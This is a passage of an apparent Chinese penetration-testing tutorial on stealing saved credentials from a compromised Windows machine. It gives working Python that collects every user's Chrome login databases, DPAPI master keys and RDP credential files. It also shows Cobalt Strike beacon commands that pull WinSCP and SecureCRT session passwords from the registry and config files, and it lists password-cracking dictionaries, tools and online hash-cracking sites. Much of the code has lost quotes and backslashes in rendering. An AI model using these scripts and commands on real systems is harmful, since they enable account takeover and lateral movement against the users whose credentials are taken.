        ret <span class="token operator">=</span> win32crypt<span class="token punctuation">.</span><span class="token function">CryptUnprotectData</span><span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> None<span class="token punctuation">,</span> None<span class="token punctuation">,</span> None<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'url：%-50s username：%-20s password：%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ret<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    except Exception as e<span class="token punctuation">:</span>
        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'url：%-50s get Chrome password Filed...'</span> <span class="token operator">%</span> row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        pass
conn<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>tmp_file<span class="token punctuation">)</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200930113246514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>0x03. 离线导出当前系统下另一用户的Chrome密码</strong></p>
<p>使用工具Windows Password Recovery</p>
<p>解密需要获得三部分内容：</p>
<p>加密密钥(即Master Key file)，位于%appdata%\Microsoft\Protect下对应sid文件夹下的文件<br>
数据库文件Login Data<br>
用户明文的密码，用于解密加密密钥<br>
环境模拟：<br>
环境：一台windows10机器，里面装有谷歌浏览器，用户有administrator和test等等其他用户</p>
<p>目的：当我们拿到shell后，当前用户是administrator，我们想要获取test等其他用户在当前系统保存的谷歌浏览器密码。</p>
<p>前提条件：需要知道test账户的明文密码，可以通过导注册表方法获取test的明文密码</p>
<p>工具：py编译后的exe工具</p>
<p>filepack.exe执行后会获取 1. 所有用户谷歌浏览器的Login Data文件 2. 获取所有用户的master key file 3. 获取所有用户的rdp保存凭证（该文件用来破解RDP，此处无用）</p>
<p>如下图是filepack.exe执行的结果，会在当前目录生成三个压缩文件<br>
<img src="https://img-blog.csdnimg.cn/20200930113311304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
goole.zip是所有用户谷歌浏览器的Login Data压缩包 protect.zip是所有用户的master key file压缩包 rdp.zip是所有用户的rdp保存凭证压缩包<br>
<img src="https://img-blog.csdnimg.cn/20200930113323987.png#pic_center" alt="在这里插入图片描述"></p>
<p><strong>filepack源码<br>
获取目标服务器的重要文件<br>
– coding:utf-8 -</strong><br>
import os import shutil import sqlite3 import win32crypt</p>
<p>users_dir = os.environ[‘userprofile’].rsplit(’’, 1)[0] # 获取users目录的路径</p>
<p>def searchlogindata(path, name): for root, dirs, files in os.walk(path): if name in files: root = str(root) logindatapath = root + ‘’ + name return logindatapath</p>
<p><strong>获取所有用户的谷歌的Login Data文件</strong></p>
<p>def logindata(): print(’-’ * 50 + ‘\n’ + r’[2] Get all users Google login data files:’) name = ‘Login Data’ for username in os.listdir(usersdir): Googledir = usersdir + ‘’ + username + r’\AppData\Local\Google’ logindatapath = searchlogindata(Googledir, name) if logindatapath: try: os.makedirs(’./google’) except Exception as e: pass dst = ‘./google/{}logindata’.format(username) shutil.copyfile(logindatapath, dst) print('copy [{}] '.format(logindatapath)) logindatapath = ‘’</p>
<pre><code class="prism language-c"><span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span><span class="token function">isdir</span><span class="token punctuation">(</span><span class="token string">'google'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    shutil<span class="token punctuation">.</span><span class="token function">make_archive</span><span class="token punctuation">(</span><span class="token string">"./google"</span><span class="token punctuation">,</span> <span class="token string">'zip'</span><span class="token punctuation">,</span> root_dir<span class="token operator">=</span><span class="token string">'./google'</span><span class="token punctuation">)</span>
    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'[+] success! google.zip save to {}\pgoogle.zip'</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    shutil<span class="token punctuation">.</span><span class="token function">rmtree</span><span class="token punctuation">(</span><span class="token string">'./google'</span><span class="token punctuation">)</span>
</code></pre>
<p>获取所有用户的master key file</p>
<p>def masterkey(): print(’-’ * 50 + ‘\n’ + r’[3] Get the master key file for all users:’) for username in os.listdir(usersdir): Protectdir = usersdir + ‘’ + username + r’\AppData\Roaming\Microsoft\Protect’ if os.path.isdir(Protectdir): shutil.makearchive("./protect/{}protect".format(username), ‘zip’, rootdir=Protectdir) # 每个用户的protect压缩为usernameprotect.zip print(‘copy [{}]’.format(Protectdir))</p>
<pre><code class="prism language-c"><span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span><span class="token function">isdir</span><span class="token punctuation">(</span><span class="token string">'protect'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    shutil<span class="token punctuation">.</span><span class="token function">make_archive</span><span class="token punctuation">(</span><span class="token string">"./protect"</span><span class="token punctuation">,</span> <span class="token string">'zip'</span><span class="token punctuation">,</span> root_dir<span class="token operator">=</span><span class="token string">'./protect'</span><span class="token punctuation">)</span>
    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'[+] success! protect.zip save to {}\protect.zip'</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    shutil<span class="token punctuation">.</span><span class="token function">rmtree</span><span class="token punctuation">(</span><span class="token string">'./protect'</span><span class="token punctuation">)</span>
</code></pre>
<p><strong>获取所有用户的rdp保存凭证</strong></p>
<p>def rdp(): print(’-’ * 50 + ‘\n’ + r’[4] Get RDP save credentials for all users:’) for username in os.listdir(usersdir): RDPdir = usersdir + ‘’ + username + r’\AppData\Local\Microsoft\Credentials’ if os.path.isdir(RDPdir): shutil.makearchive("./rdp/{}rdp".format(username), ‘zip’, rootdir=RDPdir) print(‘copy [{}]’.format(RDPdir))</p>
<pre><code class="prism language-c"><span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span><span class="token function">isdir</span><span class="token punctuation">(</span><span class="token string">'./rdp'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    shutil<span class="token punctuation">.</span><span class="token function">make_archive</span><span class="token punctuation">(</span><span class="token string">"./rdp"</span><span class="token punctuation">,</span> <span class="token string">'zip'</span><span class="token punctuation">,</span> root_dir<span class="token operator">=</span><span class="token string">'./rdp'</span><span class="token punctuation">)</span>
    <span class="token function">print</span><span class="token punctuation">(</span>r<span class="token string">'[+] success! rdp.zip save to {}\rdp.zip'</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    shutil<span class="token punctuation">.</span><span class="token function">rmtree</span><span class="token punctuation">(</span><span class="token string">'./rdp'</span><span class="token punctuation">)</span>
</code></pre>
<p>logindata() masterkey() rdp() ```</p>
<p>readlogindata.exe用来读取谷歌浏览器的链接，用户名和密码（密码需要解密）<br>
<img src="https://img-blog.csdnimg.cn/20200930113532395.png#pic_center" alt="在这里插入图片描述"><br>
<strong>获取当前系统所有用户谷歌浏览器的密码<br>
– coding:utf-8 –</strong><br>
import sqlite3 import sys import os</p>
<p>try: os.makedirs(’./password’) except Exception as e: pass</p>
<p>LoginDatafile = sys.argv[1]	 # Login Data文件名</p>
<p>conn = sqlite3.connect(LoginDatafile) cursor = conn.cursor() cursor.execute(‘SELECT actionurl, usernamevalue, passwordvalue FROM logins’) for each in cursor.fetchall(): url, username, password = each print(’[{}] [username:{}] [password:需要解密]’.format(url, username)) with open(’./password/{}password.txt’.format(username), ‘ab’) as f1, open(’./password/urluserpwd.txt’, ‘at’) as f2: f1.write(each[2]) f2.writelines(‘url: {}\nusername: {}\npassword: \n{}\n’.format(url, username, ‘-’*50))</p>
<p>**</p>
<p>下图是保存所有用户谷歌浏览器的Login Data压缩包，login_data前缀是用户名，比如是administrator和test用户<br>
<img src="https://img-blog.csdnimg.cn/20200930113605807.png#pic_center" alt="在这里插入图片描述"><br>
下图是保存所有用户的master key file压缩包，protect前缀是用户名，比如是administrator和test和fskldfn用户<br>
<img src="https://img-blog.csdnimg.cn/20200930113629319.png#pic_center" alt="在这里插入图片描述"><br>
将压缩包解压后，使用readloigndata.exe去读取login data文件。</p>
<p>此处以test用户举例</p>
<p>此处是将test用户的谷歌浏览器内容读取出来<br>
<img src="https://img-blog.csdnimg.cn/20200930113649840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
因为不是当前用户，所以密码是密文需要解密。密文密码保存在当前目录的password目录下<br>
<img src="https://img-blog.csdnimg.cn/20200930113704388.png#pic_center" alt="在这里插入图片描述"><br>
_password.txt前缀是谷歌浏览器每个链接的用户名</p>
<p>urluserpwd.txt是谷歌浏览器所有保存的链接、账号、密码<br>
<img src="https://img-blog.csdnimg.cn/20200930113718397.png#pic_center" alt="在这里插入图片描述"><br>
接下来使用wpr工具解密每个_password.txt，下载地址：<br>
<img src="https://img-blog.csdnimg.cn/20200930113729945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
设置DPAPI blob file指向上述步骤生成的test用户的txt文件，然后点击下一步<br>
<img src="https://img-blog.csdnimg.cn/20200930113743328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
设置Master Key File 指向test用户的master key<br>
<img src="https://img-blog.csdnimg.cn/20200930113758794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
选择是<br>
<img src="https://img-blog.csdnimg.cn/20200930113810809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
输入test用户的明文，点击下一步，选择确定<img src="https://img-blog.csdnimg.cn/20200930113822407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
成功读取到密码，该密码就是下面链接对应的密码。</p>
<pre><code class="prism language-c">url<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.3</span><span class="token operator">/</span>DVWA<span class="token operator">-</span>master<span class="token operator">/</span>login<span class="token punctuation">.</span>php username<span class="token punctuation">:</span> admin password<span class="token punctuation">:</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200930113847553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
同理可以去读取root账号对应的密码！</p>
<p>参考文章：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>cloud<span class="token punctuation">.</span>tencent<span class="token punctuation">.</span>com<span class="token operator">/</span>developer<span class="token operator">/</span>article<span class="token operator">/</span><span class="token number">1512066</span>
</code></pre>
<hr>
<h2><a id="523_adsutilvbs_dayuFifteenth_Day_8587"></a>5.2.3 adsutil.vbs 获取密码（dayu-Fifteenth Day）</h2>
<pre><code class="prism language-c">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span><span class="token number">5</span>dmail<span class="token punctuation">.</span>net<span class="token operator">/</span>html<span class="token operator">/</span><span class="token number">2007</span><span class="token operator">-</span><span class="token number">5</span><span class="token operator">-</span><span class="token number">9</span><span class="token operator">/</span><span class="token number">20075901045.</span>htm

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>cnblogs<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token number">94</span>YY<span class="token operator">/</span>archive<span class="token operator">/</span><span class="token number">2011</span><span class="token operator">/</span><span class="token number">05</span><span class="token operator">/</span><span class="token number">28</span><span class="token operator">/</span><span class="token number">2060887.</span>html
</code></pre>
<p>这很老的知识点，当做一种思路吧…</p>
<hr>
<h2><a id="524_rdp_8597"></a>5.2.4 解密目标机器保存的rdp凭证</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>jianshu<span class="token punctuation">.</span>com<span class="token operator">/</span>p<span class="token operator">/</span><span class="token number">6</span>c11412947e5    <span class="token operator">--</span>mimikatz获取

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span><span class="token number">4</span>hou<span class="token punctuation">.</span>com<span class="token operator">/</span>posts<span class="token operator">/</span>yJ4z    <span class="token operator">--</span><span class="token operator">-</span>lsass获取

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>cnblogs<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token number">0xdd</span><span class="token operator">/</span>p<span class="token operator">/</span><span class="token number">11394566.</span>html
</code></pre>
<p>这个方法很简单，看看就记住了…</p>
<hr>
<h2><a id="525_Hashcat__8609"></a>5.2.5 Hashcat 神器详解</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xz<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>t<span class="token operator">/</span><span class="token number">4008</span>   <span class="token operator">--</span>详细

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>blog<span class="token punctuation">.</span>csdn<span class="token punctuation">.</span>net<span class="token operator">/</span>smli_ng<span class="token operator">/</span>article<span class="token operator">/</span>details<span class="token operator">/</span><span class="token number">106111493</span>

还有书上思路
</code></pre>
<p>这里遇到了就来查…</p>
<hr>
<p><strong>字典集合分享</strong></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>crackstation<span class="token punctuation">.</span>net<span class="token operator">/</span>crackstation<span class="token operator">-</span>wordlist<span class="token operator">-</span>password<span class="token operator">-</span>cracking<span class="token operator">-</span>dictionary<span class="token punctuation">.</span>htm 

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>weakpass<span class="token punctuation">.</span>com<span class="token operator">/</span>download 

http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>ophcrack<span class="token punctuation">.</span>sourceforge<span class="token punctuation">.</span>net<span class="token operator">/</span>tables<span class="token punctuation">.</span>php 

https<span class="token punctuation">:</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>fuzzdb<span class="token operator">-</span>project<span class="token operator">/</span>fuzzdb 

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>wiki<span class="token punctuation">.</span>skullsecurity<span class="token punctuation">.</span>org<span class="token operator">/</span>passwords#Password_dictionaries
</code></pre>
<p>战略支援部近期会对网络上的字典进行下载整理汇总,形成较完整的字典表…拿走</p>
<p><strong>其他暴力破解软件</strong></p>
<pre><code class="prism language-c">Aircrack<span class="token operator">-</span>ng<span class="token operator">-</span>WIFI破解工具 

John The Ripper<span class="token operator">--</span>功能强大的破解工具包 

Medusa<span class="token operator">--</span>在线破解工具 

Ophcrack<span class="token operator">--</span>LM<span class="token operator">-</span>Hash破解神器 

THC Hydra<span class="token operator">--</span>在线破解工具 

WFUZZ<span class="token operator">--</span>WebFuzz神器
</code></pre>
<p><strong>在线解Hash网站</strong></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>cmd5<span class="token punctuation">.</span>com<span class="token operator">/</span> 

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>crackstation<span class="token punctuation">.</span>net<span class="token operator">/</span>

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>onlinehashcrack<span class="token punctuation">.</span>com<span class="token operator">/</span> 

tps<span class="token punctuation">:</span><span class="token operator">/</span>www<span class="token punctuation">.</span>objectif<span class="token operator">-</span>securite<span class="token punctuation">.</span>ch<span class="token operator">/</span>ophcrack<span class="token punctuation">.</span>php 

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>hce<span class="token punctuation">.</span>iteknical<span class="token punctuation">.</span>com<span class="token operator">/</span>
</code></pre>
<hr>
<h2><a id="526_WinscpSecureCRThash_8668"></a>5.2.6 解密Winscp和SecureCRT客户端中保存的密码hash</h2>
<h2><a id="Winscp_8669"></a>Winscp</h2>
<p><strong>前言</strong></p>
<p>WinSCP是一个Windows环境下使用的SSH的开源图形化SFTP客户端。同时支持SCP协议。它的主要功能是在本地与远程计算机间安全地复制文件，并且可以直接编辑文件。而我们的主要目的是为了读取里面各种的SHH连接密码。</p>
<p>所有操作全部在管理员权限下进行</p>
<p><strong>最新版Winscp为例</strong></p>
<p>通过powershell脚本搞定，或者RDP直接登录连接查询等。 「绿色版无安装记录」</p>
<pre><code class="prism language-c">beacon<span class="token operator">&gt;</span> powershell<span class="token operator">-</span>import <span class="token operator">/</span>Users<span class="token operator">/</span>anonysec<span class="token operator">/</span>ListInstalledPrograms<span class="token punctuation">.</span>ps1

beacon<span class="token operator">&gt;</span> powershell Get<span class="token operator">-</span>list
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201001204955304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
前提，目标得事先保存连接密码<br>
<img src="https://img-blog.csdnimg.cn/20201001205013947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>确定Winscp存储位置</strong></p>
<p>默认情况下，Winscp配置会存储在Windows对应的注册表项下（包括了连接的IP、用户名、密码Hash）</p>
<pre><code class="prism language-c">HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP <span class="token number">2</span>\Sessions\
</code></pre>
<p><strong>具体解密过程</strong></p>
<p>1.查看Winscp配置的Windows注册表（注册表项是固定的），如果有连接会话，再指定查询连接下所保存的密码Hash。</p>
<pre><code class="prism language-c">beacon<span class="token operator">&gt;</span> shell reg query <span class="token string">"HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions"</span>

beacon<span class="token operator">&gt;</span> shell reg query <span class="token string">"HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\root@192.168.144.128"</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201001205104512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
将查到的信息拷贝到本地的winscppwd.exe进行解密<br>
<img src="https://img-blog.csdnimg.cn/20201001205120209.png#pic_center" alt="在这里插入图片描述"><br>
2.RDP直接登录目标，导出Winscp配置文件，并下载到本地进行解密<br>
<img src="https://img-blog.csdnimg.cn/20201001205134108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201001205140440.png#pic_center" alt="在这里插入图片描述"></p>
<h2><a id="SecureCRT_8713"></a>SecureCRT</h2>
<p><strong>前言</strong></p>
<p>SecureCRT是运维人员常用的管理工具。但由于某些运维人员的安全意识不高，平时很可能会把SSH的连接密码都保存在里面，这就给了渗透人员可乘之机，为后续跨平台横向移动做了准备。而我们的主要目的是为了解密保存在SecureCRT中的这些SHH连接密码，并通过这种方式实现Windows到Linux之间的快速横向渗透。</p>
<p>所有操作全部在管理员权限下进行，解密脚本仅限于 SecureCRT 7.x 以下版本，高版本需要使用结尾处的方法。如果SecureCRT有启动密码，Config加密了，就不要搞了<img src="https://img-blog.csdnimg.cn/20201001205233293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>确定目标SecureCRT的详细版本</strong></p>
<p>想办法确定SecureCRT的详细版本，通过powershell脚本搞定，或者直接RDP登录连接查询等 「绿色版无安装记录」。发现目标所用的详细版本为 7.1.1（build 264）</p>
<pre><code class="prism language-c">beacon<span class="token operator">&gt;</span> powershell<span class="token operator">-</span>import <span class="token operator">/</span>Users<span class="token operator">/</span>anonysec<span class="token operator">/</span>ListInstalledPrograms<span class="token punctuation">.</span>ps1

beacon<span class="token operator">&gt;</span> powershell Get<span class="token operator">-</span>list
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201001205320907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201001205333908.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>确定SecureCRT配置文件目录下的Sessions目录</strong></p>
<p>默认情况下，SecureCRT的Config目录路径为：%APPDATA%\VanDyke\Config\Sessions\</p>
<p>如果无法确定路径，可以通过图形界面在SecureCRT菜单的全局选项中来确认<br>
<img src="https://img-blog.csdnimg.cn/20201001205358802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
Sessions目录下的每个ini文件都会以连接的IP或域名来命名</p>
<pre><code class="prism language-c">beacon<span class="token operator">&gt;</span>shell dir <span class="token operator">%</span>APPDATA<span class="token operator">%</span>\VanDyke\Config\Sessions\
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020100120542420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>拷贝下载Sessions目录的ini文件</strong></p>
<p>直接到Sessions目录下载ini文件可能会有问题（应该程序占用），即使下载下来，到本地可能无法解密。所以，先用Invoke-NinjaCopy.ps1脚本把ini文件先copy到其他目录，然后再去下载。</p>
<pre><code class="prism language-c">beacon<span class="token operator">&gt;</span> powershell<span class="token operator">-</span>import <span class="token operator">/</span>Users<span class="token operator">/</span>anonysec<span class="token operator">/</span>Invoke<span class="token operator">-</span>NinjaCopy<span class="token punctuation">.</span>ps1

beacon<span class="token operator">&gt;</span> powershell Invoke<span class="token operator">-</span>NinjaCopy <span class="token operator">-</span>Path <span class="token string">"C:\Users\r00t\AppData\Roaming\VanDyke\Config\Sessions\192.168.144.128.ini"</span> <span class="token operator">-</span>LocalDestination <span class="token string">"c:\windows\temp\192.168.144.128.ini"</span>

beacon<span class="token operator">&gt;</span> shell dir c<span class="token punctuation">:</span>\windows\temp\<span class="token number">192.168</span><span class="token number">.144</span><span class="token number">.128</span><span class="token punctuation">.</span>ini 

beacon<span class="token operator">&gt;</span> download c<span class="token punctuation">:</span>\windows\temp\<span class="token number">192.168</span><span class="token number">.144</span><span class="token number">.128</span><span class="token punctuation">.</span>ini
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201001205447294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>脚本解密Session</strong></p>
<p>将下载的ini文件拷贝到本地，利用脚本进行解密。环境：python 2.7、pycrypto库。此处解密脚本仅限于 SecureCRT 7.x 以下的版本！</p>
<pre><code class="prism language-c">sudo pip2 install pycrypto
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201001205513748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">python SecureCRT<span class="token operator">-</span>decryptpass<span class="token punctuation">.</span>py <span class="token number">192.168</span><span class="token number">.144</span><span class="token number">.128</span><span class="token punctuation">.</span>ini
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201001205538136.png#pic_center" alt="在这里插入图片描述"><br>
<strong>SecureCRT高版本解决</strong></p>
<p>如果目标的SecureCRT版本较高，无法进行解密该怎么办？此处以 8.5.3（X64 build 1867）为例，直接把对应%APPDATA%\VanDyke\Config\ 整个目录拷贝到本机SecureCRT的Config目录下，然后直接连接。</p>
<p>目标SecureCRT版本与本地版本需一致，否则可能会出现问题<br>
<img src="https://img-blog.csdnimg.cn/20201001205558216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201001205606916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2><a id="_8776"></a>附上脚本</h2>
<p>Winscp:<br>
<a href="https://github.com/3gstudent/ListInstalledPrograms/blob/master/ListInstalledPrograms.ps1">ListInstalledPrograms.ps1</a></p>
<p><a href="https://bitbucket.org/knarf/winscppwd/downloads/winscppwd.exe">winscppwa.exe</a>   --目前无法连接</p>
<p>SecureCRT：<br>
<a href="https://github.com/3gstudent/ListInstalledPrograms/blob/master/ListInstalledPrograms.ps1">ListInstalledPrograms.ps1</a></p>
<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1">Invoke-NinjaCopy.ps1</a></p>
<p><a href="https://github.com/gitPoc32/Forensic/blob/5c82582d21811a2257e3f68bd95f5e8735d834cd/VanDykeSecureCRT/SecureCRT-decryptpass.py">SecureCRT-decryptpass.py</a></p>
<hr>
<h2><a id="527_Weblogic_8791"></a>5.2.7 破解Weblogic配置文件中的数据库密码</h2>
